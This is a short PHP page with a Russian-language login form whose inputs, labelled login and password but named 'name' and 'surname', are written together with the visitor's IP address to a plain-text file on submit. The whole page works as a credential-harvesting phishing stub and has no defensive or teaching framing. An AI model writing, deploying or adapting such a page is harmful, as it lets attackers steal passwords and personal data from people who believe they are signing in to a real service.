<html>
<head></head>
<body>
<?php
if(empty($_POST['submit'])){}
if(empty($_POST['name'])){}
if(empty($_POST['surname'])){}
else{
	$file = "file.txt";
	$file = fopen($file, "a");
	$name = $_POST['name'];
	$surname = $_POST['surname'];
	$ip = $_SERVER[REMOTE_ADDR];
	$res_name = fwrite($file,"Логин:$name");
	$res_surname = fwrite($file,"   Пароль:$surname");
	$res_ip = fwrite($file,"   IP:$ip \n");
	unset($res_name);
	unset($res_surname);
	unset($res_ip);
}
?>
  <form method="post">
   <input name="name"  placeholder="Логин"/>
   <input name="surname" placeholder="Пароль"/>
   <input type="submit" value="Ввод">
  </form>
</body>
</html>

